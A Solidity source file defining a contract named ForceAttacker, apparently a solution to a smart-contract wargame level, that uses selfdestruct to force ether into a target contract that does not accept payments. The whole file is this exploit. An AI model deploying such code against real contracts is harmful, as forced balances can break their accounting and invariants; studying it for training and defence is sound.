// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract ForceAttacker {
    error ForceAttacker__MustNotBeZero();

    address payable public force;

    constructor(address payable _force) {
        force = _force;
    }

    function attack() external payable {
        if (msg.value == 0) {
            revert ForceAttacker__MustNotBeZero();
        }
        selfdestruct(force); // This is a deprecated feature though
    }
}
